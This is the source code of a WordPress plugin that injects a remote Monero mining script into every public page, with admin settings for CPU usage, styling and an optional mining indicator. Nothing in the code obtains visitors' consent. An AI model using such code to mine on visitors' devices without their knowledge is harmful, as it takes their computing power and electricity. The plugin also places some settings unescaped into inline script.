<?php
/**
 * @package Moonify
 * @version 0.2
 */
/*
Plugin Name: Moonify Monero Web Mining Wordpress Plugin
Plugin URI: http://wordpress.org/plugins/moonify-monero-web-mining-wordpress-plugin
Description: Earn money from your visitors while they just browse your site. 
They will be mining cryptocurrency (Monero) for you by using their computing power.
Author: Moonify.io
Version: 0.2
Author URI: http://moonify.io
*/

function moon_register_scripts()
{
	$moon_content = "Moonify.set({serviceID:\"".esc_attr(get_option('_moon_api_key'))."\",
   customize: {
      ".(get_option("_moon_default_position") != "" ? "position: \"".get_option("_moon_default_position")."\"," : "")."
      ".(get_option("_moon_default_effect") != "" ? "effect: \"".get_option("_moon_default_effect")."\"," : "")."
      ".(get_option("_moon_default_bgcolor") != "" ? "colorBG: \"".get_option("_moon_default_bgcolor")."\"," : "")."
      ".(get_option("_moon_default_primcolor") != "" ? "colorPrimary: \"".get_option("_moon_default_primcolor")."\"," : "")."
      ".(get_option("_moon_default_reflect") != "" ? "reflect: ".(get_option("_moon_default_reflect") == 1 ? "true" : "false")."," : "")."
      ".(get_option("_moon_default_indicator") != "" ? "indicator: ".(get_option("_moon_default_indicator") == 1 ? "true" : "false")."," : "")."
      ".(get_option("_moon_default_edge") != "" ? "edge: ".get_option("_moon_default_edge")."" : "")."
   }
   });
   Moonify.start();
   Moonify.setSpeed(".esc_attr(get_option('_moon_default_speed')).");";
	
	wp_register_script  ('moon-js', 'https://pkg.moonify.io/moonify.min.js', false, '1.0', true );
	wp_enqueue_script   ('moon-js');
	wp_add_inline_script('moon-js', $moon_content);
}

function register_moon_settings() {
	register_setting( 'moonify-settings', '_moon_api_key' );
	register_setting( 'moonify-settings', '_moon_default_speed' );
  register_setting( 'moonify-settings', '_moon_default_bgcolor' );
  register_setting( 'moonify-settings', '_moon_default_primcolor' );
  register_setting( 'moonify-settings', '_moon_default_effect' );
  register_setting( 'moonify-settings', '_moon_default_position' );
  register_setting( 'moonify-settings', '_moon_default_reflect' );
  register_setting( 'moonify-settings', '_moon_default_indicator' );
  register_setting( 'moonify-settings', '_moon_default_edge' );
}

function load_moonadmin_scripts( ) {
  wp_enqueue_style('wp-color-picker');
  wp_enqueue_script('myplugin-script', plugins_url('js/script.js', __FILE__), array('wp-color-picker'), false, true );
}

function moon_settings_page()
{
?>
<div class="wrap">
<h1>Moonify</h1>

<form method="post" action="options.php">
    <?php settings_fields( 'moonify-settings' ); ?>
    <?php do_settings_sections( 'moonify-settings' ); ?>
    <table class="form-table">
        <tr valign="top">
        <th scope="row">Moonify Javascript SDK Key</th>
        <td><input type="text" name="_moon_api_key" value="<?php echo esc_attr( get_option('_moon_api_key') ); ?>" /></td>
        </tr>
         
        <tr valign="top">
        <th scope="row">Default Speed Percentage</th>
        <td><input type="range" min="0.1" max="1.0" step="0.01" list="_moon_cpu_tickmarks" name="_moon_default_speed" value="<?php echo esc_attr( get_option('_moon_default_speed') ); ?>" />

		<datalist id="_moon_cpu_tickmarks">
  		<option value="0" label="0%">
  		<option value="0.1">
  		<option value="0.2">
  		<option value="0.3">
  		<option value="0.4">
  		<option value="0.5" label="50%">
  		<option value="0.6">
  		<option value="0.7">
  		<option value="0.8">
  		<option value="0.9">
  		<option value="1.0" label="100%">
  		</datalist>
      </td>
        </tr>

      <th scope="row">Optional Customization</th>

    <tr valign="top">
        <th scope="row">Background Color</th>
      <td><input type='text' class='color-field' name="_moon_default_bgcolor" value="<?php echo esc_attr( get_option('_moon_default_bgcolor') ); ?>"></td>
    </tr>

    <tr valign="top">
        <th scope="row">Primary Color</th>
      <td><input type='text' class='color-field' name="_moon_default_primcolor" value="<?php echo esc_attr( get_option('_moon_default_primcolor') ); ?>"></td>
    </tr>

    <tr valign="top">
        <th scope="row">Effect</th>
    <td><select name="_moon_default_effect">
      <option value="slide" <?php echo (get_option('_moon_default_effect') == "slide" ? "selected=\"selected\"" : ""); ?> >slide</option>
      <option value="zoom" <?php echo (get_option('_moon_default_effect') == "zoom" ? "selected=\"selected\"" : ""); ?> >zoom</option>
      <option value="flip" <?php echo (get_option('_moon_default_effect') == "flip" ? "selected=\"selected\"" : ""); ?> >flip</option>
      <option value="bounce" <?php echo (get_option('_moon_default_effect') == "bounce" ? "selected=\"selected\"" : ""); ?> >bounce</option>
    </select>
  </td>
  </tr>

  <tr valign="top">
        <th scope="row">Position</th>
    <td><select name="_moon_default_position">
      <option value="bottomleft" <?php echo (get_option('_moon_default_position') == "bottomleft" ? "selected=\"selected\"" : ""); ?> >bottomleft</option>
      <option value="bottomright" <?php echo (get_option('_moon_default_position') == "bottomright" ? "selected=\"selected\"" : ""); ?> >bottomright</option>
      <option value="topleft" <?php echo (get_option('_moon_default_position') == "topleft" ? "selected=\"selected\"" : ""); ?> >topleft</option>
      <option value="topright" <?php echo (get_option('_moon_default_position') == "topright" ? "selected=\"selected\"" : ""); ?> >topright</option>
    </select>
  </td>
  </tr>

  <tr valign="top">
        <th scope="row">Reflect</th>
      <td><input type='checkbox' name="_moon_default_reflect" value="1" <?php checked( '1', get_option( '_moon_default_reflect' ) ); ?> /></td>
    </tr>

    <tr valign="top">
        <th scope="row">Mining indicator</th>
      <td><input type='checkbox' name="_moon_default_indicator" value="1" <?php checked( '1', get_option( '_moon_default_indicator' ) ); ?> /></td>
    </tr>

    <tr valign="top">
        <th scope="row">Distance from screen edge</th>
        <datalist id="_moon_edge_tickmarks">
      <option value="0" label="0">
      <option value="1">
      <option value="2">
      <option value="3">
      <option value="4">
      <option value="5" label="5">
      <option value="6">
      <option value="7">
      <option value="8">
      <option value="9">
      <option value="10" label="10">
      </datalist>
      <td><input type="range" min="0" max="10" step="1" list="_moon_edge_tickmarks" name="_moon_default_edge" value="<?php echo esc_attr( get_option('_moon_default_edge') ); ?>"></td>
    </tr>

    </table>
    
    <?php submit_button(); ?>

</form>
</div>
<?php
}

function moon_config_menu()
{
	$ppage = add_menu_page('Moonify Settings', 'Moonify', 'administrator', __FILE__, 'moon_settings_page' , plugins_url('/moonify-icon.png', __FILE__) );
	add_action( 'admin_init', 'register_moon_settings' );
  add_action( 'admin_print_scripts-'.$ppage, 'load_moonadmin_scripts');
}

add_action('admin_menu', 'moon_config_menu');
add_action('wp_enqueue_scripts', 'moon_register_scripts');

?>
